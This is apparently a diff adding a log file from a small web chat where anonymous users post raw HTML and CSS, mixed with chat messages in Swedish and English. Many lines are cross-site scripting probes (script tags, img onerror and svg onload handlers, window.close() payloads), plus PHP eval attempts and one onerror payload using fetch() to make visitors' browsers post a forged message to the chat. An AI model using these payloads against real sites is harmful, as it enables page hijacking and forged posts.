@@ -1,0 +1,61 @@
+
+Anonymous user: <img src="img/skullsmall.gif" alt="Skull" class="logo">
+Anonymous user: < script> alert ("hello") </script>
+Anonymous user: <sscript> alert ("hello") </script>
+Anonymous user: < script > alert ("hello") </script>
+Anonymous user: <iframe href="http://thorsson.tplinkdns.com:55744"> </iframe>
+Anonymous user: sigma sigma boy
+Anonymous user: <img src="img/name.gif" alt="Name">
+Anonymous user: <img src="img/skullsmall.gif" alt="Skull" class="logo">
+Anonymous user: <head>     <link rel="stylesheet" href="styles.css">     <title>Welcome to thorsson.tplinkdns.com</title> </head>
+Anonymous user: <iframe src="http://thorsson.tplinkdns.com:55744" title="moment"></iframe>
+Anonymous user: document.getElementById('chat-box').innerHTML = chatBox.innerHTML;
+Anonymous user: <meta charset="ASCII">
+Anonymous user: <styles> .chat-box { width="1000px; } </styles>
+Anonymous user: <styles> .chat-box { width: 1500px; height: 1000px } </styles>
+Anonymous user: <"content">
+Anonymous user: <styles> .chat-box div { width: 1500px; height: 1000px } </styles>
+Anonymous user: <styles> div { width: 1500px; height: 1000px } </styles>
+Anonymous user: <meta charset="ASCII">
+Anonymous user: document.getElementById('chat-box').innerHTML = chatBox.innerHTML;
+Anonymous user: <link rel="stylesheet" href="sidebar.html">
+Anonymous user: <styles> #chat-box { width: 1500px; height: 1000px } </styles>
+Anonymous user: <style>         #chat-box {             width: 400px;             height: 1500px;             border: 1px solid #ccc;             overflow-y: scroll;             padding: 10px;             margin-bottom: 10px;         }         #message-input {             width: 1500px;             padding: 5px;         }     </style>
+Anonymous user: <style>         #chat-box {             width: 1500px;             height: 1000px;             border: 1px solid #ccc;             overflow-y: scroll;             padding: 10px;             margin-bottom: 10px;         }         #message-input {             width: 500px;             padding: 5px;         }     </style>
+Anonymous user: <style>         #chat-box {  color: wheat   }     </style>
+Anonymous user: <style>         #chat-box {  background-color: grey   }     </style>
+Anonymous user: <style>         #chat-box { background-color: #1f2427cc;  }     </style>
+Anonymous user: <style>         #chat-box {    background-color: #1f2427cc;   }     </style>
+Anonymous user: <style>         #chat-box {     color: #DB6D14;    }     </style>
+Anonymous user: <styles> * {  font-family: monospace; } </styles>
+Anonymous user: <styles> # {  font-family: monospace; } </styles>
+Anonymous user: <style>         #chat-box {      font-family: monospace;    }     </style>
+Anonymous user: <h1>huh</h1>
+Anonymous user: <img src="https://images.app.goo.gl/XupyeotxSXAaqcCU7" width="500" height="600">
+Anonymous user: <img src="https://images.app.goo.gl/dYNphqXbDPp6vGHT6" width="500" height="600">
+Anonymous user: <p class="ping-pong"💀💀💀💀💀💀💀💀💀💀</p> @keyframes pingPong {   0% {     transform: translateX(-100%);   }   100% {     transform: translateX(100%);   } }  p.ping-pong {   display: inline-block; /* Ensures the element doesn't take full width */   white-space: nowrap; /* Prevents text from wrapping */   animation: pingPong 3s linear infinite; /* Adjust duration as needed */ }
+Anonymous user: <p style="display: inline-block; white-space: nowrap; animation: pingPong 3s linear infinite;">   ¯\_(ツ)_/¯¯\_(ツ)_/¯¯\_(ツ)_/¯¯\_(ツ)_/¯ </p>   <style>   @keyframes pingPong {     0% {       transform: translateX(-100%);     }     100% {       transform: translateX(100%);     }   } </style>
+Anonymous user: <p style="display: inline-block; white-space: nowrap; animation: pingPong 3s linear infinite;">   hell yeah </p>
+Anonymous user: 💀
+Anonymous user: test
+Anonymous user: <img src="/-/media/employeeimages/33/employee_image_frean33.jpeg?as=1&amp;w=300&amp;h=300&amp;cr=1&amp;crw=300&amp;crh=300&amp;bc=%23ffffff&amp;hash=58EA9B12DE26084426984E0095ADBF1B" alt="frean33">
+Anonymous user: <img src="https://liu.se/-/media/employeeimages/33/employee_image_frean33.jpeg?as=1&w=300&h=300&cr=1&crw=300&crh=300&bc=%23ffffff&hash=58EA9B12DE26084426984E0095ADBF1B" alt="frean33">
+Anonymous user: <iframe src="https://www.desmos.com/calculator" style="border:2px #000000 solid;" name="myiFrame" scrolling="no" frameborder="1" marginheight="0px" marginwidth="0px" height="600px" width="800px" allowfullscreen></iframe>
+Anonymous user: #dcg-graph-outer {    color: #DB6D14;       }
+Anonymous user: <h1>&lt;script>alert(1)&lt;/script></h1>
+Anonymous user: &lt;script>alert(1)&lt;/script>
+Anonymous user: Vad säger Bibeln om otrohet?
+Anonymous user: <img src="x" onerror="alert('oh naj, inte hackare på min interwebsida')">
+Anonymous user: <svg/onload=alert('XSS')>
+Anonymous user: <?php eval ("echo test;"); ?>
+Anonymous user: <?php eval ("ls"); ?>
+Anonymous user: <img onerror="window.close();">
+Anonymous user: <img onerror="window.close()">
+Anonymous user: <img onerror=alert("dö")>
+Anonymous user: <img src="x" onerror="window.close()">
+Anonymous user: hej
+Anonymous user: <img src="x" onerror="fetch('http://thorsson.tplinkdns.com:55744/send.php', {method: 'POST',body: JSON.stringify({message: 'jag är homosexuell'})})">
+Anonymous user: <img src="x" onerror="fetch('send.php', {method: 'POST',body: JSON.stringify({message: 'jag är homosexuell'})})">
+Anonymous user: <img src="x" onerror="alert(69420)">
+Anonymous user: <img/src=x/onerror('bebe')/>
+Anonymous user: <iframe href="http://thorsson.tplinkdns.com:55744/chat.html"> </iframe><br />
